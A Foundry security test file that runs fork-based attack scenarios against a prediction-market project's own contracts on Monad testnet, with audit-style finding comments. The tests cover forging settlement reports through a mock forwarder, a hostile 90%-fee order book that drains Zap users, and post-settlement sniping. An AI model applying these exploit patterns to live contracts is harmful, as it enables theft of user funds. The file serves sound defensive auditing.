// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, Vm} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Resolver} from "../../src/Resolver.sol";
import {CollateralVault} from "../../src/CollateralVault.sol";
import {IsothermZap, IKuruRouterView} from "../../spikes/e2e/src/IsothermZap.sol";
import {CivilDate} from "../utils/CivilDate.sol";
import {RawReport} from "./SecUtils.sol";

interface IFaucetF {
    function requestFunds(address to) external;
}

interface IMockFwdF {
    function report(address receiver, bytes calldata rawReport, bytes calldata ctx, bytes[] calldata sigs) external;
}

interface IKuruRouterF {
    function deployProxy(
        uint8 t,
        address base,
        address quote,
        uint96 sizePrecision,
        uint32 pricePrecision,
        uint32 tickSize,
        uint96 minSize,
        uint96 maxSize,
        uint256 takerFeeBps,
        uint256 makerFeeBps,
        uint96 ammSpread
    ) external returns (address);
}

interface IKuruBookF {
    function batchUpdate(
        uint32[] calldata buyPrices,
        uint96[] calldata buySizes,
        uint32[] calldata sellPrices,
        uint96[] calldata sellSizes,
        uint40[] calldata cancel,
        bool postOnly
    ) external;
    function placeAndExecuteMarketBuy(uint96 quoteSize, uint256 minOut, bool isMargin, bool fok)
        external
        payable
        returns (uint256);
}

interface IMarginF {
    function deposit(address user, address token, uint256 amount) external payable;
}

/// @notice Attacks that need LIVE Monad testnet contracts (real CRE MockKeystoneForwarder, real Kuru v1 Router/books,
///         real AUSD + faucet), run on a local fork. Skipped unless MONAD_TESTNET_RPC is set.
/// Run: MONAD_TESTNET_RPC=https://testnet-rpc.monad.xyz FORK_BLOCK=68693965 forge test --match-path test/security/ForkAttacks.t.sol -vv
contract ForkAttacksTest is Test {
    IERC20 constant AUSD = IERC20(0xa9012a055bd4e0eDfF8Ce09f960291C09D5322dC);
    IFaucetF constant FAUCET = IFaucetF(0xd236c18D274E54FAccC3dd9DDA4b27965a73ee6C);
    IMockFwdF constant MOCK_FWD = IMockFwdF(0xB9F79d863261869B234c481D1f9A7af84AeAd192);
    address constant PROD_FWD = 0xF8344CFd5c43616a4366C34E3EEE75af79a74482;
    IKuruRouterF constant ROUTER = IKuruRouterF(0x7EFbE105Ca7415dE98F96622173458ac1c054630);
    IMarginF constant MARGIN = IMarginF(0xd029C2D98ff85D8F64799017fE00a59B1159CE02);
    bytes32 constant REPORT_PROCESSED = keccak256("ReportProcessed(address,bytes32,bytes2,bool)");
    bytes32 constant SIM_WF = 0x1111111111111111111111111111111111111111111111111111111111111111;
    address constant SIM_OWNER = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa;

    uint256 constant ATTESTER_PK = 0xA11CE;
    address owner;
    address maker = makeAddr("maker");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address sniper = makeAddr("sniper");

    Resolver resolver;
    CollateralVault vault;
    IsothermZap zap;
    bool forked;
    uint32 date;
    uint256 dayEnd;
    bytes32 id;
    IERC20 yes;

    function setUp() public {
        string memory rpc = vm.envOr("MONAD_TESTNET_RPC", string(""));
        if (bytes(rpc).length == 0) return;
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, blk);
        forked = true;
        owner = vm.addr(ATTESTER_PK);
        vm.startPrank(owner);
        resolver = new Resolver(owner, address(MOCK_FWD), owner, owner);
        vault = new CollateralVault(owner, resolver, AUSD, owner);
        resolver.registerStation("RCSS", 8 hours);
        date = CivilDate.localDate(block.timestamp + 1 days, 8 hours);
        dayEnd = resolver.dayEnd("RCSS", date);
        id = vault.createSeries("RCSS", date, 30, uint64(dayEnd - 1 hours));
        vm.stopPrank();
        yes = IERC20(address(vault.getSeries(id).yes));
        zap = new IsothermZap(IKuruRouterView(address(ROUTER)), vault);
    }

    modifier onlyFork() {
        if (!forked) {
            vm.skip(true);
            return;
        }
        _;
    }

    // ------------------------------------------------------------------------------------------------
    // CRE forwarder misconfiguration, against the REAL MockKeystoneForwarder
    // ------------------------------------------------------------------------------------------------

    function test_fork_RESIDUAL_realMockForwarderAttestationOffAnyoneSettles() public onlyFork {
        vm.startPrank(owner);
        resolver.setExpectedWorkflow(keccak256("isotherm-settle"), makeAddr("wfOwner"));
        resolver.setAttestationRequired(false); // wrong order: forwarder is still the permissionless mock
        vm.stopPrank();
        vm.warp(dayEnd);
        bytes memory forged = abi.encode(bytes4("RCSS"), date, int16(70), false, bytes32(0), bytes(""));
        bytes memory raw =
            RawReport.build(keccak256("evil"), resolver.expectedWorkflowId(), resolver.expectedWorkflowOwner(), forged);
        assertTrue(_mockReport(raw, attacker), "real mock forwarder delivered an unsigned forged report");
        assertEq(resolver.resultOf("RCSS", date).tmaxC, 70);
    }

    function test_fork_FIXED_switchBackToRealMockRearmsAttestation() public onlyFork {
        vm.startPrank(owner);
        resolver.setForwarder(PROD_FWD);
        resolver.setExpectedWorkflow(keccak256("isotherm-settle"), makeAddr("wfOwner"));
        resolver.setAttestationRequired(false);
        resolver.setForwarder(address(MOCK_FWD)); // back to the mock for a `cre workflow simulate --broadcast` demo
        vm.stopPrank();
        assertTrue(resolver.attestationRequired());
        vm.warp(dayEnd);
        bytes memory forged = abi.encode(bytes4("RCSS"), date, int16(70), false, bytes32(0), bytes(""));
        bytes memory raw =
            RawReport.build(keccak256("evil"), resolver.expectedWorkflowId(), resolver.expectedWorkflowOwner(), forged);
        assertFalse(_mockReport(raw, attacker), "forged report rejected");
        assertEq(uint8(resolver.resultOf("RCSS", date).status), 0);
    }

    // ------------------------------------------------------------------------------------------------
    // Zap / Kuru
    // ------------------------------------------------------------------------------------------------

    /// FINDING (Medium): Kuru v1 testnet market creation is permissionless, so anyone can register a SECOND
    /// YES/AUSD book for our YES token with hostile parameters (here a 90% taker fee). Router.verifiedMarket() reports
    /// it with base == YES and quote == AUSD, so IsothermZap._market() accepts it. With minYesOut = 0 a victim
    /// routed there (UI bug, malicious front-end/agent, a plugin that discovers books from MarketRegistered events)
    /// loses ~90%. Fix: the Zap must accept only the canonical book recorded on-chain per seriesId.
    function test_fork_zapAcceptsHostileSecondBookForSameYes() public onlyFork {
        _fundAll();
        address canon = _makerBook(10); // canonical book, 0.1% taker fee, ask 100 YES @ 0.50
        // attacker: mints its own YES and lists them on a second book for the SAME token with a 90% taker fee
        vm.startPrank(attacker);
        AUSD.approve(address(vault), type(uint256).max);
        vault.mintSet(id, 100e6);
        address hostile = ROUTER.deployProxy(0, address(yes), address(AUSD), 1e6, 1e4, 10, 1e6, 1e12, 9000, 0, 100);
        yes.approve(address(MARGIN), type(uint256).max);
        MARGIN.deposit(attacker, address(yes), 100e6);
        _ask(hostile, 5000, 100e6);
        vm.stopPrank();

        vm.startPrank(victim);
        AUSD.approve(address(zap), type(uint256).max);
        (uint256 yesHostile,) = zap.buyYes(id, hostile, 10e6, 0, victim); // NOT rejected with MarketMismatch
        (uint256 yesCanon,) = zap.buyYes(id, canon, 10e6, 0, victim);
        vm.stopPrank();
        console2.log("10 AUSD via canonical book -> YES", yesCanon);
        console2.log("10 AUSD via hostile book   -> YES", yesHostile);
        assertEq(yesCanon, 19_980_000, "20 YES @0.50 minus 0.1%");
        assertEq(yesHostile, 2_000_000, "20 YES @0.50 minus 90%");
    }

    /// FINDING (Medium, operational): Kuru books keep matching after the day ends and after settlement; Isotherm
    /// cannot pause them. A maker ask left resting is free money once the outcome is public.
    function test_fork_staleMakerQuotesAfterSettlementAreFreeMoney() public onlyFork {
        _fundAll();
        address canon = _makerBook(10);
        vm.warp(dayEnd + 1 hours); // Tmax known from METAR; report lands
        assertTrue(_settle(31), "settled: 31 >= 30, YES wins");
        vm.startPrank(sniper);
        uint256 a0 = AUSD.balanceOf(sniper);
        AUSD.approve(canon, 50e6);
        uint256 got = IKuruBookF(canon).placeAndExecuteMarketBuy(50e4, 0, false, false); // 50 AUSD into the 0.50 ask
        uint256 paid = vault.redeem(id, got, 0);
        vm.stopPrank();
        int256 profit = int256(AUSD.balanceOf(sniper)) - int256(a0);
        console2.log("sniper bought winning YES after settlement:", got);
        console2.log("sniper profit (AUSD base units):", profit);
        assertEq(paid, got);
        assertGt(profit, 49e6, "~1.998x on a riskless trade");
    }

    /// Stray tokens sent to the Zap can't be taken by the next user (balance-delta accounting) - but they are also
    /// stuck forever (no sweep).
    function test_fork_zapStrayBalancesNotClaimableButStuck() public onlyFork {
        _fundAll();
        address canon = _makerBook(10);
        vm.prank(victim);
        AUSD.transfer(address(zap), 5e6); // fat-finger
        vm.prank(maker);
        yes.transfer(address(zap), 5e6);
        vm.startPrank(attacker);
        AUSD.approve(address(zap), type(uint256).max);
        yes.approve(address(zap), type(uint256).max);
        (uint256 y, uint256 refund) = zap.buyYes(id, canon, 3e6, 0, attacker);
        assertEq(y, 5_994_000);
        assertEq(refund, 0);
        vm.expectRevert(); // no bids on the book: nothing to sell into; stray YES cannot be pulled out either
        zap.sellYes(id, canon, 1e6, 1, attacker);
        vm.stopPrank();
        assertEq(AUSD.balanceOf(address(zap)), 5e6, "stray AUSD untouched");
        assertEq(yes.balanceOf(address(zap)), 5e6, "stray YES untouched");
    }

    // ------------------------------------------------------------------------------------------------

    function _fundAll() internal {
        address funder = makeAddr("funder");
        for (uint256 i; i < 3; ++i) {
            vm.prank(funder);
            try FAUCET.requestFunds(funder) {
                break;
            } catch {
                vm.warp(block.timestamp + 61); // global 60 s faucet cooldown
            }
        }
        vm.startPrank(funder);
        AUSD.transfer(maker, 600e6);
        AUSD.transfer(attacker, 300e6);
        AUSD.transfer(victim, 100e6);
        AUSD.transfer(sniper, 100e6);
        vm.stopPrank();
    }

    function _makerBook(uint256 takerFeeBps) internal returns (address m) {
        vm.startPrank(maker);
        AUSD.approve(address(vault), type(uint256).max);
        vault.mintSet(id, 300e6);
        m = ROUTER.deployProxy(0, address(yes), address(AUSD), 1e6, 1e4, 10, 1e6, 1e12, takerFeeBps, 0, 100);
        yes.approve(address(MARGIN), type(uint256).max);
        MARGIN.deposit(maker, address(yes), 200e6);
        _ask(m, 5000, 100e6);
        vm.stopPrank();
    }

    function _ask(address m, uint32 price, uint96 size) internal {
        uint32[] memory ap = new uint32[](1);
        uint96[] memory asz = new uint96[](1);
        (ap[0], asz[0]) = (price, size);
        IKuruBookF(m).batchUpdate(new uint32[](0), new uint96[](0), ap, asz, new uint40[](0), true);
    }

    function _settle(int16 tmax) internal returns (bool) {
        bytes32 src = keccak256("iem+awc");
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(ATTESTER_PK, resolver.settlementDigest("RCSS", date, tmax, false, src));
        bytes memory payload = abi.encode(bytes4("RCSS"), date, tmax, false, src, abi.encodePacked(r, s, v));
        return _mockReport(RawReport.build(keccak256("exec"), SIM_WF, SIM_OWNER, payload), makeAddr("transmitter"));
    }

    function _mockReport(bytes memory raw, address from) internal returns (bool) {
        bytes[] memory sigs = new bytes[](4);
        for (uint256 i; i < 4; ++i) {
            sigs[i] = new bytes(65);
        }
        vm.recordLogs();
        vm.prank(from);
        MOCK_FWD.report(address(resolver), raw, new bytes(96), sigs);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(MOCK_FWD) && logs[i].topics[0] == REPORT_PROCESSED) {
                return abi.decode(logs[i].data, (bool));
            }
        }
        revert("no ReportProcessed");
    }
}
